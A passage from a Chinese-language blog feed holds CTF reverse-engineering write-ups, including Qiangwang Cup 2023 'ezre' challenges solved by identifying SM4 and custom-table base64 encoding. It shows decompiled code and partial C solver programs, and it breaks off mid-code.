class="number">0</span>;i &lt; <span class="number">48</span>;++i) &#123;</span><br><span class="line">        maybe_enc_data[i] = (maybe_enc_data[i] ^ <span class="number">0x25</span>) - <span class="number">5</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, maybe_enc_data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="type">uint64_t</span> *each = (<span class="type">uint64_t</span> *)maybe_enc_data;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">6</span>;++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, each[i]);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>;j &lt; <span class="number">64</span>;++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (each[i] &amp; <span class="number">1</span>) &#123;</span><br><span class="line">                each[i] = (each[i] ^ v2) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">                each[i] |= <span class="number">0x8000000000000000</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                each[i] = each[i] &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>((<span class="type">char</span> *)each);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240213112228396.png" alt="image-20240213112228396" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Writeup-强网杯2023</title>
      <link href="/202442c0c1ec4a9e/"/>
      <url>/202442c0c1ec4a9e/</url>
      
        <content type="html"><![CDATA[<p>题好难…</p><h1 id="reverse">Reverse</h1><h2 id="ezre">ezre</h2><p>当时分析这个题不知道这是SM4,后来才知道就是一个标准的SM4.</p><p>以后遇到不认识的加密首先尝试去查找特征值!</p><p>这个题的真正逻辑不在main中,后来经分析貌似是一个子进程调试父进程的玩意…</p><p>检查逻辑在这里:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240206101302873.png" alt="image-20240206101302873" style="zoom:50%;" /><p>进入true_check0_3580()中(我自己重命名的函数名),可以看到加密过程:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240206101410864.png" alt="image-20240206101410864" style="zoom:50%;" /><p>实际上就是一个ECB-NoPadding模式的纯SM4…</p><p>其中v8是16byte的key;v7是加密后的32byte的密文.</p><p>提取出数据后写代码整理:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> v7[<span class="number">4</span>];</span><br><span class="line">    v7[<span class="number">0</span>] = <span class="number">0x7C88631647197506</span>LL;                 <span class="comment">// enc,32bytes</span></span><br><span class="line">    v7[<span class="number">1</span>] = <span class="number">0x4A0D7D3FFF55668B</span>LL;</span><br><span class="line">    v7[<span class="number">2</span>] = <span class="number">0xDEC2E93F384ED2F5</span>LL;</span><br><span class="line">    v7[<span class="number">3</span>] = <span class="number">0x3C1FB1746F7F7CDB</span>LL;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> v8[<span class="number">2</span>];</span><br><span class="line">    v8[<span class="number">0</span>] = <span class="number">0xEFCDAB8967452301</span>LL;                 <span class="comment">// key,16bytes</span></span><br><span class="line">    v8[<span class="number">1</span>] = <span class="number">0xEFCDAB8967452301</span>LL;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *ptr = (<span class="type">unsigned</span> <span class="type">char</span> *) v8;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="keyword">sizeof</span>(v8);++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>,ptr[i]);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    ptr=(<span class="type">unsigned</span> <span class="type">char</span> *)v7;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="keyword">sizeof</span>(v7);++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>,ptr[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0123456789abcdef0123456789abcdef</span><br><span class="line">067519471663887c8b6655ff3f7d0d4af5d24e383fe9c2dedb7c7f6f74b11f3c</span><br></pre></td></tr></table></figure><p>直接在线解密即可:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240206101824721.png" alt="image-20240206101824721" style="zoom:50%;" /><h2 id="强网先锋-ezre">强网先锋-ezre</h2><p>两人合作做出来的…</p><p>其中</p><p>分析过程比较费劲,而且实际上完全没有必要…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main函数的分析</span></span><br><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span> &#123;</span><br><span class="line">    <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">size_t</span> v4; <span class="comment">// rsi</span></span><br><span class="line">    <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> k; <span class="comment">// [rsp+12Ch] [rbp-114h]</span></span><br><span class="line">    <span class="type">int</span> j; <span class="comment">// [rsp+130h] [rbp-110h]</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [rsp+134h] [rbp-10Ch]</span></span><br><span class="line">    <span class="type">int</span> v10; <span class="comment">// [rsp+13Ch] [rbp-104h]</span></span><br><span class="line">    <span class="type">char</span> v11[<span class="number">64</span>]; <span class="comment">// [rsp+140h] [rbp-100h] BYREF</span></span><br><span class="line">    <span class="type">char</span> v12[<span class="number">64</span>]; <span class="comment">// [rsp+180h] [rbp-C0h] BYREF</span></span><br><span class="line">    <span class="type">char</span> v13[<span class="number">64</span>]; <span class="comment">// [rsp+1C0h] [rbp-80h] BYREF</span></span><br><span class="line">    <span class="type">char</span> s[<span class="number">52</span>]; <span class="comment">// [rsp+200h] [rbp-40h] BYREF</span></span><br><span class="line">    <span class="type">int</span> v15; <span class="comment">// [rsp+234h] [rbp-Ch]</span></span><br><span class="line">    <span class="type">size_t</span> v16; <span class="comment">// [rsp+238h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v15 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the CTF world:&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x32</span>uLL);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">    v16 = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">if</span> (v16 != <span class="number">34</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    sub_401980((__int64)s, (__int64)v11, v3);     <span class="comment">// 先对flag进行一次base64变表</span></span><br><span class="line">    <span class="keyword">while</span> (v10 &lt; <span class="number">4</span>)                             <span class="comment">// 4次循环</span></span><br><span class="line">    &#123;</span><br><span class="line">        srand(aLUsn4j5rfj0tav[<span class="number">2</span>]);</span><br><span class="line">        v4 = <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)(<span class="type">unsigned</span> <span class="type">int</span>)aLUsn4j5rfj0tav);</span><br><span class="line">        sub_401D10(aLUsn4j5rfj0tav, v4);            <span class="comment">// 对表干了些事情,总之是生成新的表</span></span><br><span class="line">        <span class="keyword">if</span> ((v10 &amp; <span class="number">1</span>) != <span class="number">0</span>)                       <span class="comment">// v10 是循环变量,从0到3</span></span><br><span class="line">            <span class="comment">// 此时当v10为奇数 1或3时</span></span><br><span class="line">        &#123;</span><br><span class="line">            v5 = <span class="built_in">strlen</span>(v11);                         <span class="comment">// v11是变表base64加密一次后的flag</span></span><br><span class="line">            sub_401980((__int64)v11, (__int64)v12, v5);<span class="comment">// 用新表进行再一次base64</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            sub_401250(v11, v12);                     <span class="comment">// 否则执行这个加密,已分析,加密解释见内部注释</span></span><br><span class="line">            <span class="comment">// 本质上就是将每个字符求得其在表中的下标,只需要6个二进制位来存储,然后压缩为3个字节</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(v11, <span class="number">0</span>, <span class="number">0x32</span>uLL);</span><br><span class="line">        <span class="built_in">memcpy</span>(v11, v12, <span class="number">0x32</span>uLL);</span><br><span class="line">        ++v10;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (check_debug == <span class="number">1</span>)  <span class="comment">// 这个if用的变量怀疑有反调试,</span></span><br><span class="line">           <span class="comment">// 如果检测到调试就会改变base64表的处理方式,</span></span><br><span class="line">           <span class="comment">// 导致最后一次处理发生变化!</span></span><br><span class="line">    &#123;</span><br><span class="line">        sub_402EE0(aLUsn4j5rfj0tav, &amp;aLUsn4j5rfj0tav[<span class="number">64</span>]);</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i)</span><br><span class="line">            aLUsn4j5rfj0tav[i] = (<span class="number">5</span> * (aLUsn4j5rfj0tav[i] + <span class="number">3</span>)) ^ <span class="number">0x15</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 这个处理才是正确的流程</span></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">64</span>; ++j)</span><br><span class="line">            aLUsn4j5rfj0tav[j] ^= <span class="number">0x27</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_401EB0(v12, v13);   <span class="comment">// 使用base64表进行某种加密</span></span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; ; ++k) &#123;</span><br><span class="line">        <span class="keyword">if</span> (k &gt;= <span class="built_in">strlen</span>(v12)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;right!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (aKqhfyc[k] != v13[k])</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就是该死的sub_401250(),后来发现这玩意就是一个标准至极的base64_decode()…只不过变表了而已…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 分析sub_401250()</span></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_401250</span><span class="params">(__int64 str, __int64 res)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 idx_1; <span class="comment">// [rsp+93h] [rbp-1Dh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 idx_2; <span class="comment">// [rsp+94h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 idx_3; <span class="comment">// [rsp+95h] [rbp-1Bh]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 idx_4; <span class="comment">// [rsp+96h] [rbp-1Ah]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 i; <span class="comment">// [rsp+97h] [rbp-19h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> res_idx; <span class="comment">// [rsp+98h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> str_idx; <span class="comment">// [rsp+9Ch] [rbp-14h]</span></span><br><span class="line">  __int64 res_p; <span class="comment">// [rsp+A0h] [rbp-10h]</span></span><br><span class="line">  __int64 str_p; <span class="comment">// [rsp+A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  str_p = str;</span><br><span class="line">  res_p = res;</span><br><span class="line">  str_idx = <span class="number">0</span>;                                  <span class="comment">// 遍历str用的下标</span></span><br><span class="line">  res_idx = <span class="number">0</span>;                                  <span class="comment">// 用于访问res的下标,指向res中的已写入字符的后一个空位(即准备存储下一个加密后字符的位置)</span></span><br><span class="line">  <span class="keyword">while</span> ( *(_BYTE *)(str_p + str_idx) )         <span class="comment">// 遍历源str,4个字符一组</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;idx_1, <span class="number">0</span>, <span class="number">4uLL</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">64u</span>; ++i )                 <span class="comment">// 遍历base64表(注意这个表会发生变化)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(<span class="type">char</span> *)(str_p + str_idx) == aLUsn4j5rfj0tav[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        idx_1 = i;                              <span class="comment">// 找到str[str_idx]这个字符在表中的下标i,记录在idx_1中</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">64u</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(<span class="type">char</span> *)(str_p + str_idx + <span class="number">1</span>) == aLUsn4j5rfj0tav[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        idx_2 = i;                              <span class="comment">// 找到str[str_idx+1]这个字符在表中的下标i,记录在idx_2中</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v2 = res_idx++;</span><br><span class="line">    *(_BYTE *)(res_p + v2) = ((<span class="type">int</span>)idx_2 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">3</span> | (<span class="number">4</span> * idx_1);<span class="comment">// 分析:0x40(即表长)需要6个二进制位去存,所以不考虑最高的2位(都是0),剩下丢失的位会在后面的操作中补上,不会丢失信息</span></span><br><span class="line">                                                <span class="comment">// 具体操作如下:</span></span><br><span class="line">                                                <span class="comment">// 假设idx_2=(二进制)00111001;idx_1=(二进制)00100011;</span></span><br><span class="line">                                                <span class="comment">// 1.将idx_2右移4位丢弃低4位(1001),然后&amp;3丢弃高2位(00),也就是说将这6个二进制位的高2位置于结果的低2位,即00000011</span></span><br><span class="line">                                                <span class="comment">// 2.将idx_1乘4即左移2位,结果为(10001100),也就是</span></span><br><span class="line">                                                <span class="comment">// 3.两者进行按位或,即相加,结果为(10001111)</span></span><br><span class="line">                                                <span class="comment">// 也就是结果将idx_1的6位和idx_2的高2位进行组合,生成一个新的字节,idx_1无信息丢失,idx_2待补全</span></span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(str_p + str_idx + <span class="number">2</span>) == <span class="string">&#x27;=&#x27;</span> )<span class="comment">// 如果当前分组的第3个字符(?)为&#x27;=&#x27;说明base编码遍历结束?,则停止遍历</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">64u</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(<span class="type">char</span> *)(str_p + str_idx + <span class="number">2</span>) == aLUsn4j5rfj0tav[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        idx_3 = i;                              <span class="comment">// 找到str[str_idx+2]这个字符在表中的下标i,记录在idx_3中</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = res_idx++;</span><br><span class="line">    *(_BYTE *)(res_p + v3) = ((<span class="type">int</span>)idx_3 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0xF</span> | (<span class="number">16</span> * idx_2);<span class="comment">// 仍然假设idx_2=(二进制)00111001;</span></span><br><span class="line">                                                <span class="comment">// 假设idx_3=(二进制)00100011;</span></span><br><span class="line">                                                <span class="comment">// 1.idx_3右移2位,与0xF,只保留原来中间的4位,放在结果的低4位</span></span><br><span class="line">                                                <span class="comment">// 2.idx_2左移4位,丢弃高2位,保留低4位,放在结果的高4位</span></span><br><span class="line">                                                <span class="comment">// 3.结果合并</span></span><br><span class="line">                                                <span class="comment">// 此时前面idx_2舍弃的低4位存储在此处,没有信息损失</span></span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(str_p + str_idx + <span class="number">3</span>) == <span class="number">61</span> )<span class="comment">// 如果当前分组的第4个字符(?)为&#x27;=&#x27;说明base编码遍历结束?,则停止遍历</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">64u</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(<span class="type">char</span> *)(str_p + str_idx + <span class="number">3</span>) == aLUsn4j5rfj0tav[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        idx_4 = i;                              <span class="comment">// 找到str[str_idx+3]这个字符在表中的下标i,记录在idx_4中</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = res_idx++;</span><br><span class="line">    *(_BYTE *)(res_p + v4) = idx_4 &amp; <span class="number">0x3F</span> | (idx_3 &lt;&lt; <span class="number">6</span>);<span class="comment">// 假设idx_3=(二进制)00100011;idx_4=00111001;</span></span><br><span class="line">                                                <span class="comment">// 1.idx_4按位与0x3F(00111111),保留有效6位</span></span><br><span class="line">                                                <span class="comment">// 2.idx_3左移6位,保留原来的低2位,存于结果的高2位</span></span><br><span class="line">                                                <span class="comment">// 3.合并,此时idx_3补齐,idx_4无信息损失</span></span><br><span class="line">    str_idx += <span class="number">4</span>;                               <span class="comment">// 循环下标+=4,准备下一组处理</span></span><br><span class="line">  &#125;                                             <span class="comment">// 注意:结尾有&#x27;=&#x27;,则说明填充为8个bit的0,对应前面未补全的字符则为</span></span><br><span class="line">  *(_BYTE *)(res_p + (<span class="type">int</span>)res_idx) = <span class="number">0</span>;         <span class="comment">// 补齐结尾&#x27;\0&#x27;</span></span><br><span class="line">  <span class="keyword">return</span> res_idx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个加密主要就是变表的base64,动调跑出来所有用到的base64表:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;l+USN4J5Rfj0TaVOcnzXiPGZIBpoAExuQtHyKD692hwmqe7/Mgk8v1sdCW3bYFLr&quot;</span>,</span><br><span class="line"><span class="string">&quot;FGseVD3ibtHWR1czhLnUfJK6SEZ2OyPAIpQoqgY0w49u+7rad5CxljMXvNTBkm/8&quot;</span>,</span><br><span class="line"><span class="string">&quot;Hc0xwuZmy3DpQnSgj2LhUtrlVvNYks+BX/MOoETaKqR4eb9WF8ICGzf6id1P75JA&quot;</span>,</span><br><span class="line"><span class="string">&quot;pnHQwlAveo4DhGg1jE3SsIqJ2mrzxCiNb+Mf0YVd5L8c97/WkOTtuKFZyRBUPX6a&quot;</span>,</span><br><span class="line"><span class="string">&quot;plxXOZtaiUneJIhk7qSYEjD1Km94o0FTu52VQgNL3vCBH8zsA/b+dycGPRMwWfr6&quot;</span></span><br></pre></td></tr></table></figure><p>最后的那个sub_401EB0(v12,v13);需要写出逆函数,分析过程没了,总之就是使用最后的base64表做一个处理,生成一个新的表,然后用它来把数据做最后一次加密.</p><p>但是其中用求模等等的运算,后来还是想办法逆出来了.</p><p>所以总的加密过程就是:</p><ul><li>将flag做一次base64编码.</li><li>然后交替的进行base64解码和编码各2次,一共4次.</li><li>最后做一次sub_401EB0()加密.</li></ul><p>其中base64表就是用上面提取出来的表.</p><p>解密过程就反向即可,首先是对最后一个加密函数sub_401EB0()的逆变换:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> aKqhfyc[<span class="number">48</span>] = &#123;</span><br><span class="line">            <span class="number">0x3A</span>, <span class="number">0x2C</span>, <span class="number">0x4B</span>, <span class="number">0x51</span>, <span class="number">0x68</span>, <span class="number">0x46</span>, <span class="number">0x59</span>, <span class="number">0x63</span>, <span class="number">0x24</span>, <span class="number">0x04</span>,</span><br><span class="line">            <span class="number">0x5E</span>, <span class="number">0x5F</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x2B</span>, <span class="number">0x03</span>, <span class="number">0x29</span>, <span class="number">0x5C</span>, <span class="number">0x74</span>, <span class="number">0x70</span>,</span><br><span class="line">            <span class="number">0x6A</span>, <span class="number">0x62</span>, <span class="number">0x7F</span>, <span class="number">0x3D</span>, <span class="number">0x2C</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0x13</span>, <span class="number">0x06</span>, <span class="number">0x0D</span>,</span><br><span class="line">            <span class="number">0x06</span>, <span class="number">0x0C</span>, <span class="number">0x4D</span>, <span class="number">0x56</span>, <span class="number">0x0F</span>, <span class="number">0x28</span>, <span class="number">0x4D</span>, <span class="number">0x51</span>, <span class="number">0x76</span>, <span class="number">0x70</span>,</span><br><span class="line">            <span class="number">0x2B</span>, <span class="number">0x05</span>, <span class="number">0x51</span>, <span class="number">0x68</span>, <span class="number">0x48</span>, <span class="number">0x55</span>, <span class="number">0x24</span>, <span class="number">0x19</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建v7_arr</span></span><br><span class="line">    <span class="type">int</span> v7 = <span class="number">2023</span>;</span><br><span class="line">    <span class="type">int</span> v7_arr[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> v6 = <span class="number">0</span>; v6 &lt; <span class="number">48</span>; ++v6) &#123;</span><br><span class="line">        <span class="keyword">if</span> (v6 % <span class="number">3</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            v7 = (v7 + <span class="number">5</span>) % <span class="number">20</span>;</span><br><span class="line">            